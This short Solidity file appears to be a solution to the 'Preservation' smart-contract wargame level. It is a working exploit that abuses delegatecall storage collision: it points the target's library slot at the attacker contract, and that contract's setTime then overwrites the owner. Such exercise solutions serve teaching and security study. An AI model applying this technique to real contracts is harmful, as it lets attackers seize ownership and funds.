//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Preservation.sol";

contract Preservation_exp {
    address tmp1;
    address tmp2;
    address owner;
    Preservation _pre;
    constructor(Preservation a1) public {
        _pre = a1;
    }

    function setTime(uint256 _time) public {
        owner = address(0x3CeE531D7d776D3370484A881bE380dEa317af9e);
    }

    function  attack() public {
        uint256 number = uint256(uint160(address(this)));
        uint256 number2 = 0x1234567;
        _pre.setFirstTime(number);
        _pre.setFirstTime(number2);
    }
}
